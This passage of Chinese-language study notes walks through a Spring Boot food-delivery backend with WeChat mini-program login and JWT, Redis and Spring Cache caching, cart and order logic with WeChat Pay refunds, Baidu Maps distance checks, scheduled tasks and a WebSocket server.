page。一个小程序主体部分由三个文件组成，必须放在项目的根目录，如下： **app.js：**必须存在，主要存放小程序的逻辑代码 **app.json：**必须存在，小程序配置文件，主要存放小程序的公共配置 app.wxss: 非必须存在，主要存放小程序公共样式表，类似于前端的CSS样式 每个小程序页面主要由四个文件组成：\n**js文件：**必须存在，存放页面业务逻辑代码，编写的js代码。\n**wxml文件：**必须存在，存放页面结构，主要是做页面布局，页面效果展示的，类似于HTML页面。\n**json文件：**非必须，存放页面相关的配置。\n**wxss文件：**非必须，存放页面样式表，相当于CSS文件。\n实现微信登录 步骤分析：\n小程序端，调用wx.login()获取code，就是授权码。\n小程序端，调用wx.request()发送请求并携带code，请求开发者服务器(自己编写的后端服务)。\n开发者服务端，通过HttpClient向微信接口服务发送请求，并携带appId+appsecret+code三个参数。\n开发者服务端，接收微信接口服务返回的数据，session_key+opendId等。opendId是微信用户的唯一标识。\n开发者服务端，自定义登录态，生成令牌(token)和openid等数据返回给小程序端，方便后绪请求身份校验。\n小程序端，收到自定义登录态，存储storage。\n小程序端，后绪通过wx.request()发起业务请求时，携带token。\n开发者服务端，收到请求后，通过携带的token，解析当前登录用户的id。\n开发者服务端，身份校验通过后，继续相关的业务逻辑处理，最终返回业务数据。\n基于文档描述的所需参数，即可设计出登录接口\n请求参数：前端像后端传递 code\n返回数据：后端请求接口，再返回 id、openid、token\n设计用户表\nController\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 public class UserController { @Autowired private UserService userService; @Autowired private JwtProperties jwtProperties; /** * 微信登录 * @param userLoginDTO * @return */ @PostMapping(\u0026#34;/login\u0026#34;) @ApiOperation(\u0026#34;微信登录\u0026#34;) public Result\u0026lt;UserLoginVO\u0026gt; login(@RequestBody UserLoginDTO userLoginDTO){ log.info(\u0026#34;微信用户登录：{}\u0026#34;,userLoginDTO.getCode()); //微信登录 User user = userService.wxLogin(userLoginDTO); //为微信用户生成jwt令牌 Map\u0026lt;String, Object\u0026gt; claims = new HashMap\u0026lt;\u0026gt;(); claims.put(JwtClaimsConstant.USER_ID,user.getId()); String token = JwtUtil.createJWT(jwtProperties.getUserSecretKey(), jwtProperties.getUserTtl(), claims); UserLoginVO userLoginVO = UserLoginVO.builder() .id(user.getId()) .openid(user.getOpenid()) .token(token) .build(); return Result.success(userLoginVO); } } Service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 package com.sky.service.impl; @Service @Slf4j public class UserServiceImpl implements UserService { //微信服务接口地址 public static final String WX_LOGIN = \u0026#34;https://api.weixin.qq.com/sns/jscode2session\u0026#34;; @Autowired private WeChatProperties weChatProperties; @Autowired private UserMapper userMapper; /** * 微信登录 * @param userLoginDTO * @return */ public User wxLogin(UserLoginDTO userLoginDTO) { String openid = getOpenid(userLoginDTO.getCode()); //判断openid是否为空，如果为空表示登录失败，抛出业务异常 if(openid == null){ throw new LoginFailedException(MessageConstant.LOGIN_FAILED); } //判断当前用户是否为新用户 User user = userMapper.getByOpenid(openid); //如果是新用户，自动完成注册 if(user == null){ user = User.builder() .openid(openid) .createTime(LocalDateTime.now()) .build(); userMapper.insert(user);//后绪步骤实现 } //返回这个用户对象 return user; } /** * 调用微信接口服务，获取微信用户的openid * @param code * @return */ private String getOpenid(String code){ //调用微信接口服务，获得当前微信用户的openid Map\u0026lt;String, String\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;appid\u0026#34;,weChatProperties.getAppid()); map.put(\u0026#34;secret\u0026#34;,weChatProperties.getSecret()); map.put(\u0026#34;js_code\u0026#34;,code); map.put(\u0026#34;grant_type\u0026#34;,\u0026#34;authorization_code\u0026#34;); String json = HttpClientUtil.doGet(WX_LOGIN, map); JSONObject jsonObject = JSON.parseObject(json); String openid = jsonObject.getString(\u0026#34;openid\u0026#34;); return openid; } } 配置令牌校验 学一下怎么校验 Claims claims = JwtUtil.parseJWT(jwtProperties.getUserSecretKey(), token); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 @Component @Slf4j public class JwtTokenUserInterceptor implements HandlerInterceptor { @Autowired private JwtProperties jwtProperties; /** * 校验jwt * * @param request * @param response * @param handler * @return * @throws Exception */ public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { //判断当前拦截到的是Controller的方法还是其他资源 if (!(handler instanceof HandlerMethod)) { //当前拦截到的不是动态方法，直接放行 return true; } //1、从请求头中获取令牌 String token = request.getHeader(jwtProperties.getUserTokenName()); //2、校验令牌 try { log.info(\u0026#34;jwt校验:{}\u0026#34;, token); Claims claims = JwtUtil.parseJWT(jwtProperties.getUserSecretKey(), token); Long userId = Long.valueOf(claims.get(JwtClaimsConstant.USER_ID).toString()); log.info(\u0026#34;当前用户的id：\u0026#34;, userId); BaseContext.setCurrentId(userId); //3、通过，放行 return true; } catch (Exception ex) { //4、不通过，响应401状态码 response.setStatus(401); return false; } } } 缓存 菜品 - 原始方法 用户端小程序展示的菜品数据都是通过查询数据库获得，如果用户端访问量比较大，数据库访问压力随之增大。\n用 Redis 缓存菜品数据，减少数据库操作 缓存逻辑分析：\n每个分类下的菜品保存一份缓存数据 数据库中菜品数据有变更时清理缓存数据 Controller\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // 修改 DishController 调用 Mapper 的逻辑 public Result\u0026lt;List\u0026lt;DishVO\u0026gt;\u0026gt; list(Long categoryId) { //构造redis中的key，规则：dish_分类id String key = \u0026#34;dish_\u0026#34; + categoryId; //查询redis中是否存在菜品数据 List\u0026lt;DishVO\u0026gt; list = (List\u0026lt;DishVO\u0026gt;) redisTemplate.opsForValue().get(key); if(list != null \u0026amp;\u0026amp; list.size() \u0026gt; 0){ //如果存在，直接返回，无须查询数据库 return Result.success(list); } //////////////////////////////////////////////////////// Dish dish = new Dish(); dish.setCategoryId(categoryId); dish.setStatus(StatusConstant.ENABLE);//查询起售中的菜品 //如果不存在，查询数据库，将查询到的数据放入redis中 list = dishService.listWithFlavor(dish); //////////////////////////////////////////////////////// redisTemplate.opsForValue().set(key, list); return Result.success(list); } 为了保证数据库和Redis中的数据保持一致，修改管理端接口 DishController 的相关方法，加入清理缓存逻辑。\nController 再新增、删除、更新等逻辑后面添加 支持通配符删除 1 2 3 4 5 // 管理端 DishController 中的清理缓存逻辑 private void cleanCache(String pattern){ Set keys = redisTemplate.keys(pattern); redisTemplate.delete(keys); } 套餐 - SpringCache Spring Cache 是一个框架，实现了基于注解的缓存功能，只需要简单地加一个注解，就能实现缓存功能。\nSpring Cache 提供了一层抽象，底层可以切换不同的缓存实现，例如：\nEHCache Caffeine Redis(常用) 1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-cache\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.7.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 常用注解 注解 说明 @EnableCaching 开启缓存注解功能，通常加在启动类上 @Cacheable 在方法执行前先查询缓存中是否有数据，如果有数据，则直接返回缓存数据；如果没有缓存数据，调用方法并将方法返回值放到缓存中 @CachePut 将方法的返回值放到缓存中 @CacheEvict 将一条或多条数据从缓存中删除 @CachePut(value = \u0026ldquo;userCache\u0026rdquo;, key = \u0026ldquo;#user.id\u0026rdquo;)\n@Cacheable(cacheNames = \u0026ldquo;userCache\u0026rdquo;,key=\u0026quot;#id\u0026quot;)\n@CacheEvict(cacheNames = \u0026ldquo;userCache\u0026rdquo;,key = \u0026ldquo;#id\u0026rdquo;)\n启动类中添加 @EnableCaching 用户端 SetmealController 的 list 方法上加入@Cacheable注解 @Cacheable(cacheNames = \u0026quot;setmealCache\u0026quot;,key = \u0026quot;#categoryId\u0026quot;)\n管理端接口SetmealController的 save、delete、update、startOrStop等方法上加入 CacheEvict 注解 @CacheEvict(cacheNames = \u0026quot;setmealCache\u0026quot;,allEntries = true)\n购物车 新增 关注点\n只能查询自己购物车的数据：shoppingCart.setUserId(BaseContext.getCurrentId()); 添加菜品 or 套餐的判断 Controller\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package com.sky.service.impl; @Service public class ShoppingCartServiceImpl implements ShoppingCartService { @Autowired private ShoppingCartMapper shoppingCartMapper; @Autowired private DishMapper dishMapper; @Autowired private SetmealMapper setmealMapper; /** * 添加购物车 * * @param shoppingCartDTO */ public void addShoppingCart(ShoppingCartDTO shoppingCartDTO) { ShoppingCart shoppingCart = new ShoppingCart(); BeanUtils.copyProperties(shoppingCartDTO, shoppingCart); //只能查询自己的购物车数据 shoppingCart.setUserId(BaseContext.getCurrentId()); //判断当前商品是否在购物车中 List\u0026lt;ShoppingCart\u0026gt; shoppingCartList = shoppingCartMapper.list(shoppingCart); if (shoppingCartList != null \u0026amp;\u0026amp; shoppingCartList.size() == 1) { //如果已经存在，就更新数量，数量加1 shoppingCart = shoppingCartList.get(0); shoppingCart.setNumber(shoppingCart.getNumber() + 1); shoppingCartMapper.updateNumberById(shoppingCart); } else { //如果不存在，插入数据，数量就是1 //判断当前添加到购物车的是菜品还是套餐 Long dishId = shoppingCartDTO.getDishId(); if (dishId != null) { //添加到购物车的是菜品 Dish dish = dishMapper.getById(dishId); shoppingCart.setName(dish.getName()); shoppingCart.setImage(dish.getImage()); shoppingCart.setAmount(dish.getPrice()); } else { //添加到购物车的是套餐 Setmeal setmeal = setmealMapper.getById(shoppingCartDTO.getSetmealId()); shoppingCart.setName(setmeal.getName()); shoppingCart.setImage(setmeal.getImage()); shoppingCart.setAmount(setmeal.getPrice()); } shoppingCart.setNumber(1); shoppingCart.setCreateTime(LocalDateTime.now()); shoppingCartMapper.insert(shoppingCart); } } } Service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 @Service public class ShoppingCartServiceImpl implements ShoppingCartService { @Autowired private ShoppingCartMapper shoppingCartMapper; @Autowired private DishMapper dishMapper; @Autowired private SetmealMapper setmealMapper; /** * 添加购物车 * * @param shoppingCartDTO */ public void addShoppingCart(ShoppingCartDTO shoppingCartDTO) { ShoppingCart shoppingCart = new ShoppingCart(); BeanUtils.copyProperties(shoppingCartDTO, shoppingCart); //只能查询自己的购物车数据 shoppingCart.setUserId(BaseContext.getCurrentId()); //判断当前商品是否在购物车中 List\u0026lt;ShoppingCart\u0026gt; shoppingCartList = shoppingCartMapper.list(shoppingCart); if (shoppingCartList != null \u0026amp;\u0026amp; shoppingCartList.size() == 1) { //如果已经存在，就更新数量，数量加1 shoppingCart = shoppingCartList.get(0); shoppingCart.setNumber(shoppingCart.getNumber() + 1); shoppingCartMapper.updateNumberById(shoppingCart); } else { //如果不存在，插入数据，数量就是1 //判断当前添加到购物车的是菜品还是套餐 Long dishId = shoppingCartDTO.getDishId(); if (dishId != null) { //添加到购物车的是菜品 Dish dish = dishMapper.getById(dishId); shoppingCart.setName(dish.getName()); shoppingCart.setImage(dish.getImage()); shoppingCart.setAmount(dish.getPrice()); } else { //添加到购物车的是套餐 Setmeal setmeal = setmealMapper.getById(shoppingCartDTO.getSetmealId()); shoppingCart.setName(setmeal.getName()); shoppingCart.setImage(setmeal.getImage()); shoppingCart.setAmount(setmeal.getPrice()); } shoppingCart.setNumber(1); shoppingCart.setCreateTime(LocalDateTime.now()); shoppingCartMapper.insert(shoppingCart); } } } Mapper 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package com.sky.mapper; @Mapper public interface ShoppingCartMapper { /** * 条件查询 * * @param shoppingCart * @return */ List\u0026lt;ShoppingCart\u0026gt; list(ShoppingCart shoppingCart); /** * 更新商品数量 * * @param shoppingCart */ @Update(\u0026#34;update shopping_cart set number = #{number} where id = #{id}\u0026#34;) void updateNumberById(ShoppingCart shoppingCart); /** * 插入购物车数据 * * @param shoppingCart */ @Insert(\u0026#34;insert into shopping_cart (name, user_id, dish_id, setmeal_id, dish_flavor, number, amount, image, create_time) \u0026#34; + \u0026#34; values (#{name},#{userId},#{dishId},#{setmealId},#{dishFlavor},#{number},#{amount},#{image},#{createTime})\u0026#34;) void insert(ShoppingCart shoppingCart); } 注意！User 需要用到 id，故需要设置回填！！ useGeneratedKeys\n1 2 3 4 \u0026lt;insert id=\u0026#34;insert\u0026#34; useGeneratedKeys=\u0026#34;true\u0026#34; keyProperty=\u0026#34;id\u0026#34;\u0026gt; insert into user (openid, name, phone, sex, id_number, avatar, create_time) values (#{openid}, #{name}, #{phone}, #{sex}, #{idNumber}, #{avatar}, #{createTime}) \u0026lt;/insert\u0026gt; 注意！定义了 jwt 拦截器以后要在配置类（WebMvcConfuguration）里注册！！\n1 2 3 4 5 6 7 8 9 protected void addInterceptors(InterceptorRegistry registry) { log.info(\u0026#34;开始注册自定义拦截器...\u0026#34;); registry.addInterceptor(jwtTokenAdminInterceptor) .addPathPatterns(\u0026#34;/admin/**\u0026#34;) .excludePathPatterns(\u0026#34;/admin/employee/login\u0026#34;); registry.addInterceptor(jwtTokenUserInterceptor) .addPathPatterns(\u0026#34;/user/**\u0026#34;) .excludePathPatterns(\u0026#34;/user/user/login\u0026#34;); } 查询 类似，调用动态查询即可\n删除 略\n地址簿 接口设计：\n新增地址 查询登录用户所有地址 查询默认地址 根据id修改地址 根据id删除地址 根据id查询地址 设置默认地址 类似的增删改查\n用户下单 根据接口设计 DTO、VO Controller 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package com.sky.controller.user; /** * 订单 */ @RestController(\u0026#34;userOrderController\u0026#34;) @RequestMapping(\u0026#34;/user/order\u0026#34;) @Slf4j @Api(tags = \u0026#34;C端-订单接口\u0026#34;) public class OrderController { @Autowired private OrderService orderService; @PostMapping(\u0026#34;/submit\u0026#34;) @ApiOperation(\u0026#34;用户下单\u0026#34;) public Result\u0026lt;OrderSubmitVO\u0026gt; submit(@RequestBody OrdersSubmitDTO ordersSubmitDTO) { log.info(\u0026#34;用户下单：{}\u0026#34;, ordersSubmitDTO); OrderSubmitVO orderSubmitVO = orderService.submitOrder(ordersSubmitDTO); return Result.success(orderSubmitVO); } } Service 异常处理 查询购物车数据 构造、添加订单表 构造、加入订单明细表 清空购物车，封装返回结果 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 package com.sky.service.impl; /** * 订单 */ @Service @Slf4j public class OrderServiceImpl implements OrderService { @Autowired private OrderMapper orderMapper; @Autowired private OrderDetailMapper orderDetailMapper; @Autowired private ShoppingCartMapper shoppingCartMapper; @Autowired private AddressBookMapper addressBookMapper; /** * 用户下单 * * @param ordersSubmitDTO * @return */ @Transactional public OrderSubmitVO submitOrder(OrdersSubmitDTO ordersSubmitDTO) { //异常情况的处理（收货地址为空、超出配送范围、购物车为空） AddressBook addressBook = addressBookMapper.getById(ordersSubmitDTO.getAddressBookId()); if (addressBook == null) { throw new AddressBookBusinessException(MessageConstant.ADDRESS_BOOK_IS_NULL); } Long userId = BaseContext.getCurrentId(); ShoppingCart shoppingCart = new ShoppingCart(); shoppingCart.setUserId(userId); //查询当前用户的购物车数据 List\u0026lt;ShoppingCart\u0026gt; shoppingCartList = shoppingCartMapper.list(shoppingCart); if (shoppingCartList == null || shoppingCartList.size() == 0) { throw new ShoppingCartBusinessException(MessageConstant.SHOPPING_CART_IS_NULL); } //构造订单数据 Orders order = new Orders(); BeanUtils.copyProperties(ordersSubmitDTO,order); order.setPhone(addressBook.getPhone()); order.setAddress(addressBook.getDetail()); order.setConsignee(addressBook.getConsignee()); order.setNumber(String.valueOf(System.currentTimeMillis())); order.setUserId(userId); order.setStatus(Orders.PENDING_PAYMENT); order.setPayStatus(Orders.UN_PAID); order.setOrderTime(LocalDateTime.now()); //向订单表插入1条数据 orderMapper.insert(order); //订单明细数据 List\u0026lt;OrderDetail\u0026gt; orderDetailList = new ArrayList\u0026lt;\u0026gt;(); for (ShoppingCart cart : shoppingCartList) { OrderDetail orderDetail = new OrderDetail(); BeanUtils.copyProperties(cart, orderDetail); orderDetail.setOrderId(order.getId()); orderDetailList.add(orderDetail); } //向明细表插入n条数据 orderDetailMapper.insertBatch(orderDetailList); //清理购物车中的数据 shoppingCartMapper.deleteByUserId(userId); //封装返回结果 OrderSubmitVO orderSubmitVO = OrderSubmitVO.builder() .id(order.getId()) .orderNumber(order.getNumber()) .orderAmount(order.getAmount()) .orderTime(order.getOrderTime()) .build(); return orderSubmitVO; } } 订单支付 参考支付文档：https://pay.weixin.qq.com/static/product/product_index.shtml\n流程： 关键是新增了微信后台的接口 订单管理 查询历史订单 写代码之前先想清楚用什么实体类、查什么表什么字段、返回什么！\n订单表、订单明细表不同 \u0026ndash;\u0026gt; 需要先查出订单 id，在去订单明细表中查明细 各个功能的接口要看清楚\n接收参数不一定要用实体类接……\n还要注意实体类之间的继承关系 删除订单 业务逻辑、场景要考虑全面 待支付和待接单状态下，用户可直接取消订单 商家已接单状态下，用户取消订单需电话沟通商家 派送中状态下，用户取消订单需电话沟通商家 如果在待接单状态下取消订单，需要给用户退款 取消订单后需要将订单状态修改为“已取消” 参考 Service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 /** * 用户取消订单 * * @param id */ public void userCancelById(Long id) throws Exception { // 根据id查询订单 Orders ordersDB = orderMapper.getById(id); // 校验订单是否存在 if (ordersDB == null) { throw new OrderBusinessException(MessageConstant.ORDER_NOT_FOUND); } //订单状态 1待付款 2待接单 3已接单 4派送中 5已完成 6已取消 if (ordersDB.getStatus() \u0026gt; 2) { throw new OrderBusinessException(MessageConstant.ORDER_STATUS_ERROR); } Orders orders = new Orders(); orders.setId(ordersDB.getId()); // 订单处于待接单状态下取消，需要进行退款 if (ordersDB.getStatus().equals(Orders.TO_BE_CONFIRMED)) { //调用微信支付退款接口 weChatPayUtil.refund( ordersDB.getNumber(), //商户订单号 ordersDB.getNumber(), //商户退款单号 new BigDecimal(0.01),//退款金额，单位 元 new BigDecimal(0.01));//原订单金额 //支付状态修改为 退款 orders.setPayStatus(Orders.REFUND); } // 更新订单状态、取消原因、取消时间 orders.setStatus(Orders.CANCELLED); orders.setCancelReason(\u0026#34;用户取消\u0026#34;); orders.setCancelTime(LocalDateTime.now()); orderMapper.update(orders); } 再来一单 再来一单就是将原订单中的商品重新加入到购物车中\nService 注意看对象转换的 stream 流 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 /** * 再来一单 * * @param id */ public void repetition(Long id) { // 查询当前用户id Long userId = BaseContext.getCurrentId(); // 根据订单id查询当前订单详情 List\u0026lt;OrderDetail\u0026gt; orderDetailList = orderDetailMapper.getByOrderId(id); // 将订单详情对象转换为购物车对象 List\u0026lt;ShoppingCart\u0026gt; shoppingCartList = orderDetailList.stream().map(x -\u0026gt; { ShoppingCart shoppingCart = new ShoppingCart(); // 将原订单详情里面的菜品信息重新复制到购物车对象中 BeanUtils.copyProperties(x, shoppingCart, \u0026#34;id\u0026#34;); shoppingCart.setUserId(userId); shoppingCart.setCreateTime(LocalDateTime.now()); return shoppingCart; }).collect(Collectors.toList()); // 将购物车对象批量添加到数据库 shoppingCartMapper.insertBatch(shoppingCartList); } 商家搜索 SQL 中，\u0026gt;= 会和标签混淆，故要用 \u0026amp;gt; 代替 接单、拒单、派送 简化为修改 status 字段，并且要处理退款逻辑\nService\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 /** * 拒单 * * @param ordersRejectionDTO */ public void rejection(OrdersRejectionDTO ordersRejectionDTO) throws Exception { // 根据id查询订单 Orders ordersDB = orderMapper.getById(ordersRejectionDTO.getId()); // 订单只有存在且状态为2（待接单）才可以拒单 if (ordersDB == null || !ordersDB.getStatus().equals(Orders.TO_BE_CONFIRMED)) { throw new OrderBusinessException(MessageConstant.ORDER_STATUS_ERROR); } //支付状态 Integer payStatus = ordersDB.getPayStatus(); if (payStatus == Orders.PAID) { //用户已支付，需要退款 String refund = weChatPayUtil.refund( ordersDB.getNumber(), ordersDB.getNumber(), new BigDecimal(0.01), new BigDecimal(0.01)); log.info(\u0026#34;申请退款：{}\u0026#34;, refund); } // 拒单需要退款，根据订单id更新订单状态、拒单原因、取消时间 Orders orders = new Orders(); orders.setId(ordersDB.getId()); orders.setStatus(Orders.CANCELLED); orders.setRejectionReason(ordersRejectionDTO.getRejectionReason()); orders.setCancelTime(LocalDateTime.now()); orderMapper.update(orders); } 距离检测 调用百度地图的接口，读文档即可\n设置地址、规划路径、判断\n添加到 ServiceImpl 1 2 3 4 5 @Value(\u0026#34;${sky.shop.address}\u0026#34;) private String shopAddress; @Value(\u0026#34;${sky.baidu.ak}\u0026#34;) private String ak; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 /** * 检查客户的收货地址是否超出配送范围 * @param address */ private void checkOutOfRange(String address) { Map map = new HashMap(); map.put(\u0026#34;address\u0026#34;,shopAddress); map.put(\u0026#34;output\u0026#34;,\u0026#34;json\u0026#34;); map.put(\u0026#34;ak\u0026#34;,ak); //获取店铺的经纬度坐标 String shopCoordinate = HttpClientUtil.doGet(\u0026#34;https://api.map.baidu.com/geocoding/v3\u0026#34;, map); JSONObject jsonObject = JSON.parseObject(shopCoordinate); if(!jsonObject.getString(\u0026#34;status\u0026#34;).equals(\u0026#34;0\u0026#34;)){ throw new OrderBusinessException(\u0026#34;店铺地址解析失败\u0026#34;); } //数据解析 JSONObject location = jsonObject.getJSONObject(\u0026#34;result\u0026#34;).getJSONObject(\u0026#34;location\u0026#34;); String lat = location.getString(\u0026#34;lat\u0026#34;); String lng = location.getString(\u0026#34;lng\u0026#34;); //店铺经纬度坐标 String shopLngLat = lat + \u0026#34;,\u0026#34; + lng; map.put(\u0026#34;address\u0026#34;,address); //获取用户收货地址的经纬度坐标 String userCoordinate = HttpClientUtil.doGet(\u0026#34;https://api.map.baidu.com/geocoding/v3\u0026#34;, map); jsonObject = JSON.parseObject(userCoordinate); if(!jsonObject.getString(\u0026#34;status\u0026#34;).equals(\u0026#34;0\u0026#34;)){ throw new OrderBusinessException(\u0026#34;收货地址解析失败\u0026#34;); } //数据解析 location = jsonObject.getJSONObject(\u0026#34;result\u0026#34;).getJSONObject(\u0026#34;location\u0026#34;); lat = location.getString(\u0026#34;lat\u0026#34;); lng = location.getString(\u0026#34;lng\u0026#34;); //用户收货地址经纬度坐标 String userLngLat = lat + \u0026#34;,\u0026#34; + lng; map.put(\u0026#34;origin\u0026#34;,shopLngLat); map.put(\u0026#34;destination\u0026#34;,userLngLat); map.put(\u0026#34;steps_info\u0026#34;,\u0026#34;0\u0026#34;); //路线规划 String json = HttpClientUtil.doGet(\u0026#34;https://api.map.baidu.com/directionlite/v1/driving\u0026#34;, map); jsonObject = JSON.parseObject(json); if(!jsonObject.getString(\u0026#34;status\u0026#34;).equals(\u0026#34;0\u0026#34;)){ throw new OrderBusinessException(\u0026#34;配送路线规划失败\u0026#34;); } //数据解析 JSONObject result = jsonObject.getJSONObject(\u0026#34;result\u0026#34;); JSONArray jsonArray = (JSONArray) result.get(\u0026#34;routes\u0026#34;); Integer distance = (Integer) ((JSONObject) jsonArray.get(0)).get(\u0026#34;distance\u0026#34;); if(distance \u0026gt; 5000){ //配送距离超过5000米 throw new OrderBusinessException(\u0026#34;超出配送范围\u0026#34;); } } 然后在 OrderServiceImpl 的 submitOrder 方法中调用上面的校验方法即可 SpringTask - 订单计时 Spring框架提供的任务调度工具，可以按照约定的时间自动执行某个代码逻辑。\nCron 表达式 cron表达式其实就是一个字符串，通过cron表达式可以定义任务触发的时间\n**构成规则：**分为6或7个域，由空格分隔开，每个域代表一个含义\n每个域的含义分别为：秒、分钟、小时、日、月、周、年(可选)\n**举例：**2022年10月12日上午9点整 对应的cron表达式为：0 0 9 12 10 ? 2022\n说明：一般日和周的值不同时设置，其中一个设置，另一个用？表示。\n通配符：\n* 表示所有值；\n? 表示未说明的值，即不关心它为何值；\n- 表示一个指定的范围；\n, 表示附加一个可能值；\n/ 符号前表示开始时间，符号后表示每次递增的值；\n使用步骤 导入 maven 坐标，spring-context 启动类添加注解 @EnableScheduling 开启任务调度 自定义定时任务类 定时任务类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 package com.sky.task; @Component @Slf4j public class OrderTask { @Autowired private OrderMapper orderMapper; /** * 处理支付超时订单 */ @Scheduled(cron = \u0026#34;0 * * * * ?\u0026#34;) public void processTimeoutOrder(){ log.info(\u0026#34;处理支付超时订单：{}\u0026#34;, new Date()); LocalDateTime time = LocalDateTime.now().plusMinutes(-15); // select * from orders where status = 1 and order_time \u0026lt; 当前时间-15分钟 List\u0026lt;Orders\u0026gt; ordersList = orderMapper.getByStatusAndOrdertimeLT(Orders.PENDING_PAYMENT, time); if(ordersList != null \u0026amp;\u0026amp; ordersList.size() \u0026gt; 0){ ordersList.forEach(order -\u0026gt; { order.setStatus(Orders.CANCELLED); order.setCancelReason(\u0026#34;支付超时，自动取消\u0026#34;); order.setCancelTime(LocalDateTime.now()); orderMapper.update(order); }); } } /** * 处理“派送中”状态的订单 */ @Scheduled(cron = \u0026#34;0 0 1 * * ?\u0026#34;) public void processDeliveryOrder(){ log.info(\u0026#34;处理派送中订单：{}\u0026#34;, new Date()); // select * from orders where status = 4 and order_time \u0026lt; 当前时间-1小时 LocalDateTime time = LocalDateTime.now().plusMinutes(-60); List\u0026lt;Orders\u0026gt; ordersList = orderMapper.getByStatusAndOrdertimeLT(Orders.DELIVERY_IN_PROGRESS, time); if(ordersList != null \u0026amp;\u0026amp; ordersList.size() \u0026gt; 0){ ordersList.forEach(order -\u0026gt; { order.setStatus(Orders.COMPLETED); orderMapper.update(order); }); } } } Mapper 1 2 3 //根据状态和下单时间查询订单 @Select(\u0026#34;select * from orders where status = #{status} and order_time \u0026lt; #{orderTime}\u0026#34;) List\u0026lt;Orders\u0026gt; getByStatusAndOrdertimeLT(Integer status, LocalDateTime orderTime); Websocket WebSocket 是基于 TCP 的一种新的网络协议。它实现了浏览器与服务器全双工通信——浏览器和服务器只需要完成一次握手，两者之间就可以创建持久性的连接， 并进行双向数据传输。\nWebSocket缺点：\n服务器长期维护长连接需要一定的成本 各个浏览器支持程度不一 WebSocket 是长连接，受网络限制比较大，需要处理好重连 **结论：**WebSocket并不能完全取代HTTP，它只适合在特定的场景下使用\nmaven 坐标 1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-websocket\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 服务组件定义 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package com.sky.websocket; /** * WebSocket服务 */ @Component @ServerEndpoint(\u0026#34;/ws/{sid}\u0026#34;) public class WebSocketServer { //存放会话对象 private static Map\u0026lt;String, Session\u0026gt; sessionMap = new HashMap(); /** * 连接建立成功调用的方法 */ @OnOpen public void onOpen(Session session, @PathParam(\u0026#34;sid\u0026#34;) String sid) { System.out.println(\u0026#34;客户端：\u0026#34; + sid + \u0026#34;建立连接\u0026#34;); sessionMap.put(sid, session); } /** * 收到客户端消息后调用的方法 * * @param message 客户端发送过来的消息 */ @OnMessage public void onMessage(String message, @PathParam(\u0026#34;sid\u0026#34;) String sid) { System.out.println(\u0026#34;收到来自客户端：\u0026#34; + sid + \u0026#34;的信息:\u0026#34; + message); } /** * 连接关闭调用的方法 * * @param sid */ @OnClose public void onClose(@PathParam(\u0026#34;sid\u0026#34;) String sid) { System.out.println(\u0026#34;连接断开:\u0026#34; + sid); sessionMap.remove(sid); } /** * 群发 * * @param message */ public void sendToAllClient(String message) { Collection\u0026lt;Session\u0026gt; sessions = sessionMap.values(); for (Session session : sessions) { try { //服务器向客户端发送消息 session.getBasicRemote().sendText(message); } catch (Exception e) { e.printStackTrace(); } } } } 配置类 用于注册 WebSocket 的服务端组件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package com.sky.config; /** * WebSocket配置类，用于注册WebSocket的Bean */ @Configuration @EnableWebsocket public class WebSocketConfiguration { @Bean public ServerEndpointExporter serverEndpointExporter() { 